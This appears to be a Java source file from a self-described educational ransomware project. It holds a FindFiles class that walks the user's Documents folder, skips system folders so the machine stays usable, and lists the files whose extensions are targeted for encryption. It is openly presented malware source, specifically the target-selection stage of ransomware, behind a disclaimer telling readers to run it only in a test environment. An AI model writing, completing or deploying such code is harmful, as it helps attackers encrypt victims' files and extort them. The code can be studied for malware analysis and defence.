/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 1.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;


import java.io.*;
import java.text.SimpleDateFormat;
import java.util.List;


public class FindFiles {
    static int count = 0;
    BufferedWriter fileWriter;

    //List of filetypes we want to encrypt
    FileTypes ft = new FileTypes();
    List<String> allowedFiles;


    public void FindFiles() throws Exception {
        //Use System Property rather than C:\\ to make it OS independent

        //FOR DEVELOPMENT - NOT READY TO ENCRYPT EVERYTHING - JUST THE DOCUMENTS FOLDER
        String home = System.getProperty("user.home")+ File.separator + "Desktop" + File.separator + "Documents";

        //Creating a file to write the files found into
        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
        fileWriter = new BufferedWriter(writer);

        //List of allowed files

        allowedFiles = new FileTypes().AllowedTypes;

        //Traverse the file system
        traverse(home);
        fileWriter.close();
    }
    public void traverse(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                if (f.getName().equals("Windows") || f.getName().equals("Library")) return; //want system to still work
                traverse(f.getAbsolutePath());
                System.out.println("Dir:" + f.getAbsoluteFile());
            } else {

                //split to get file extension
                int index = f.getName().lastIndexOf(".");
                String fileName = f.getName().substring(index + 1);

                //if file extension is allowed, write to file
                if(allowedFiles.contains("." + fileName.toUpperCase())) {
                    System.out.println("File:" + f.getAbsoluteFile());
                    count++;
                    fileWriter.write(f.getAbsolutePath());
                    fileWriter.newLine();
                }
            }
        }
    }

}
